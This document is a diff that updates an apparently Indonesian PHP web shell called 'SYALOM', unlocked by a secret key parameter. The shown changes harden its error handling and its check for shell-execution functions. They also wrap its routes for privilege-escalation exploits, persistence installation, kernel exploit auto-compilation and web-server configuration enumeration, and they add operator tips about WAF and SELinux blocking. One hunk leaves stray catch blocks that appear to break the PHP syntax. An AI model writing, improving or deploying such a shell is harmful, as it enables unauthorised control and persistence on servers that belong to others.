@@ -44,6 +44,75 @@ if (isset($_GET['action']) && $_GET['action'] === 'get_server_info') {
     echo get_detailed_server_info();
     exit;
 }
+
+// 🔥 SAFE JSON RESPONSE HELPERS
+function safe_json_output($data) {
+    header('Content-Type: application/json');
+    $json = json_encode($data);
+    if ($json === false) {
+        // Fallback jika JSON encoding gagal
+        echo json_encode([
+            'success' => false,
+            'error' => 'JSON encoding failed: ' . json_last_error_msg(),
+            'raw_data_type' => gettype($data)
+        ]);
+    } else {
+        echo $json;
+    }
+    exit;
+}
+
+function safe_json_error($message, $details = '') {
+    safe_json_output([
+        'success' => false,
+        'error' => $message,
+        'details' => $details,
+        'timestamp' => date('Y-m-d H:i:s')
+    ]);
+}
+
+// Check if function is available and not disabled
+function is_function_available($func) {
+    return function_exists($func) && !in_array($func, explode(',', ini_get('disable_functions')));
+}
+
+// Check if command can be executed
+function check_execution_environment() {
+    $issues = [];
+    
+    // Check PHP functions
+    $required_funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open'];
+    $available_funcs = [];
+    foreach ($required_funcs as $func) {
+        if (is_function_available($func)) {
+            $available_funcs[] = $func;
+        }
+    }
+    
+    if (empty($available_funcs)) {
+        $issues[] = 'No shell execution functions available. Check disable_functions in php.ini';
+    }
+    
+    // Check safe mode (deprecated but still used)
+    if (ini_get('safe_mode')) {
+        $issues[] = 'PHP Safe Mode is enabled';
+    }
+    
+    // Check SELinux
+    if (file_exists('/sys/fs/selinux/enforce')) {
+        $selinux = @file_get_contents('/sys/fs/selinux/enforce');
+        if (trim($selinux) === '1') {
+            $issues[] = 'SELinux is enforcing (may block commands)';
+        }
+    }
+    
+    return [
+        'available_functions' => $available_funcs,
+        'issues' => $issues,
+        'can_execute' => !empty($available_funcs)
+    ];
+}
+
 function scan_for_files($dir, $patterns, &$found_paths, &$results, $current_depth, $max_depth, $extractTitle) {
     if ($current_depth > $max_depth) return;
     if (!is_readable($dir)) return;
@@ -981,9 +1050,10 @@ if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan') {
 if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector') {
     error_reporting(0);
     ini_set('display_errors', 0);
-    header('Content-Type: application/json');
+    
     $vector = $_GET['vector'] ?? '';
-    $result = ['vector' => $vector, 'success' => false, 'data' => null];
+    $result = ['vector' => $vector, 'success' => false, 'data' => null, 'error' => ''];
+    
     try {
         switch ($vector) {
             case 'kernel':
@@ -1024,21 +1094,36 @@ if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector') {
     } catch (Throwable $e) {
         $result['error'] = $e->getMessage();
     }
-    echo json_encode($result);
-    exit;
+    } catch (Exception $e) {
+        $result['error'] = 'Exception: ' . $e->getMessage();
+    } catch (Throwable $t) {
+        $result['error'] = 'Error: ' . $t->getMessage();
+    }
+    
+    safe_json_output($result);
 }
 
 if (isset($_POST['action']) && $_POST['action'] === 'privesc_exploit') {
-    header('Content-Type: application/json');
-    $method = $_POST['method'] ?? '';
-    $target = $_POST['target'] ?? '';
-    echo json_encode(execute_privesc_exploit($method, $target));
+    try {
+        header('Content-Type: application/json');
+        $method = $_POST['method'] ?? '';
+        $target = $_POST['target'] ?? '';
+        $result = execute_privesc_exploit($method, $target);
+        echo json_encode($result);
+    } catch (Exception $e) {
+        safe_json_error('Exploit execution failed', $e->getMessage());
+    }
     exit;
 }
 
 if (isset($_POST['action']) && $_POST['action'] === 'install_persistence') {
-    header('Content-Type: application/json');
-    echo json_encode(install_persistence_mechanisms());
+    try {
+        header('Content-Type: application/json');
+        $result = install_persistence_mechanisms();
+        echo json_encode($result);
+    } catch (Exception $e) {
+        safe_json_error('Persistence installation failed', $e->getMessage());
+    }
     exit;
 }
 
@@ -1047,9 +1132,11 @@ if (isset($_POST['action']) && $_POST['action'] === 'install_persistence') {
 if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_advanced') {
     error_reporting(0);
     ini_set('display_errors', 0);
-    header('Content-Type: application/json');
-    echo json_encode(scan_advanced_privesc());
-    exit;
+    try {
+        safe_json_output(scan_advanced_privesc());
+    } catch (Exception $e) {
+        safe_json_error('Advanced scan failed', $e->getMessage());
+    }
 }
 
 if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector' && isset($_GET['vector'])) {
@@ -1058,35 +1145,50 @@ if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector' && isset
     if (in_array($vector, ['ld_preload', 'path_hijacking', 'sudo_token', 'ssh_keys', 'env_variables'])) {
         error_reporting(0);
         ini_set('display_errors', 0);
-        header('Content-Type: application/json');
-        $result = ['vector' => $vector, 'success' => true, 'data' => null];
-        switch ($vector) {
-            case 'ld_preload':
-                $result['data'] = scan_ld_preload();
-                break;
-            case 'path_hijacking':
-                $result['data'] = scan_path_hijacking();
-                break;
-            case 'sudo_token':
-                $result['data'] = scan_sudo_token();
-                break;
-            case 'ssh_keys':
-                $result['data'] = scan_ssh_keys();
-                break;
-            case 'env_variables':
-                $result['data'] = scan_env_variables();
-                break;
+        
+        $result = ['vector' => $vector, 'success' => false, 'data' => null, 'error' => ''];
+        
+        try {
+            switch ($vector) {
+                case 'ld_preload':
+                    $result['data'] = scan_ld_preload();
+                    $result['success'] = true;
+                    break;
+                case 'path_hijacking':
+                    $result['data'] = scan_path_hijacking();
+                    $result['success'] = true;
+                    break;
+                case 'sudo_token':
+                    $result['data'] = scan_sudo_token();
+                    $result['success'] = true;
+                    break;
+                case 'ssh_keys':
+                    $result['data'] = scan_ssh_keys();
+                    $result['success'] = true;
+                    break;
+                case 'env_variables':
+                    $result['data'] = scan_env_variables();
+                    $result['success'] = true;
+                    break;
+            }
+        } catch (Exception $e) {
+            $result['error'] = $e->getMessage();
         }
-        echo json_encode($result);
-        exit;
+        
+        safe_json_output($result);
     }
 }
 
 if (isset($_POST['action']) && $_POST['action'] === 'kernel_auto_compile') {
-    header('Content-Type: application/json');
-    $cve = $_POST['cve'] ?? '';
-    $kernel_version = $_POST['kernel_version'] ?? '';
-    echo json_encode(auto_compile_kernel_exploit($cve, $kernel_version));
+    try {
+        header('Content-Type: application/json');
+        $cve = $_POST['cve'] ?? '';
+        $kernel_version = $_POST['kernel_version'] ?? '';
+        $result = auto_compile_kernel_exploit($cve, $kernel_version);
+        echo json_encode($result);
+    } catch (Exception $e) {
+        safe_json_error('Kernel auto-compile failed', $e->getMessage());
+    }
     exit;
 }
 
@@ -1103,10 +1205,18 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_shells') {
 if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
     error_reporting(0);
     ini_set('display_errors', 0);
-    header('Content-Type: application/json');
+    
+    // Check execution environment first
+    $env_check = check_execution_environment();
+    if (!$env_check['can_execute']) {
+        safe_json_error(
+            'Cannot execute commands: All shell functions are disabled',
+            implode('; ', $env_check['issues'])
+        );
+    }
     
     $type = $_GET['server_type'] ?? 'all';
-    $results = ['success' => true, 'apache' => [], 'nginx' => [], 'other' => []];
+    $results = ['success' => true, 'apache' => [], 'nginx' => [], 'litespeed' => [], 'other' => [], 'warnings' => []];
     
     // Apache VirtualHost scanning
     if ($type === 'apache' || $type === 'all') {
@@ -1204,8 +1314,12 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
     $results['apache'] = array_unique($results['apache'], SORT_REGULAR);
     $results['nginx'] = array_unique($results['nginx'], SORT_REGULAR);
     
-    echo json_encode($results);
-    exit;
+    // Add any environment warnings
+    if (!empty($env_check['issues'])) {
+        $results['warnings'] = $env_check['issues'];
+    }
+    
+    safe_json_output($results);
 }
 
 function parseApacheVirtualHosts($output) {
@@ -2995,7 +3109,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 1639</h1>
+        <h1>::S Y A L O M:: ~ 280326 1648</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4674,10 +4788,34 @@ try {
         
         try {
             const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=scan_virtualhosts&server_type=' + serverType);
-            const data = await response.json();
+            
+            // Check if response is OK
+            if (!response.ok) {
+                throw new Error('HTTP Error: ' + response.status + ' ' + response.statusText);
+            }
+            
+            // Get response text first
+            const responseText = await response.text();
+            
+            // Check if response is empty
+            if (!responseText || responseText.trim() === '') {
+                throw new Error('Server returned empty response. Command may be blocked by server.');
+            }
+            
+            // Try to parse JSON
+            let data;
+            try {
+                data = JSON.parse(responseText);
+            } catch (parseError) {
+                console.error('JSON Parse Error:', parseError);
+                console.error('Response Text:', responseText.substring(0, 500));
+                throw new Error('Invalid JSON response. Server may have blocked the command or returned error.');
+            }
             
             if (!data.success) {
-                throw new Error('Scan failed');
+                const errorMsg = data.error || 'Scan failed';
+                const details = data.details || '';
+                throw new Error(errorMsg + (details ? ' (' + details + ')' : ''));
             }
             
             // Combine all results
@@ -4744,10 +4882,27 @@ try {
             renderVirtualHostResults(allVhosts, content);
             
         } catch (error) {
-            content.innerHTML = '<div style="color: #f44; padding: 20px; text-align: center;">' +
-                '<p>❌ Error: ' + escapeHtml(error.message) + '</p>' +
-                '<p style="font-size: 11px; color: #666; margin-top: 10px;">Pastikan Anda memiliki akses ke konfigurasi web server</p>' +
-                '</div>';
+            let errorHtml = '<div style="color: #f44; padding: 20px; text-align: center; background: #1a0000; border: 1px solid #f44; border-radius: 4px;">';
+            errorHtml += '<div style="font-size: 30px; margin-bottom: 10px;">⚠️</div>';
+            errorHtml += '<p style="font-weight: bold; font-size: 14px;">❌ Error: ' + escapeHtml(error.message) + '</p>';
+            
+            // Add troubleshooting tips
+            errorHtml += '<div style="margin-top: 15px; text-align: left; background: #000; padding: 10px; border-radius: 3px;">';
+            errorHtml += '<p style="font-size: 11px; color: #f80; margin-bottom: 8px;">🔧 Kemungkinan penyebab:</p>';
+            errorHtml += '<ul style="font-size: 10px; color: #888; margin: 0; padding-left: 15px;">';
+            errorHtml += '<li>Shell execution functions (shell_exec, exec, system) disabled</li>';
+            errorHtml += '<li>SELinux/AppArmor blocking commands</li>';
+            errorHtml += '<li>WAF/IDS blocking the request</li>';
+            errorHtml += '<li>Insufficient permissions to read config files</li>';
+            errorHtml += '<li>Web server configuration not in standard paths</li>';
+            errorHtml += '</ul>';
+            errorHtml += '</div>';
+            
+            errorHtml += '<p style="font-size: 10px; color: #666; margin-top: 10px;">Coba jalankan command manual via shell untuk verifikasi</p>';
+            errorHtml += '</div>';
+            
+            content.innerHTML = errorHtml;
+            document.getElementById('scanStatus').textContent = 'Error: ' + error.message.substring(0, 50) + '...';
         }
     };
 } catch (e) {
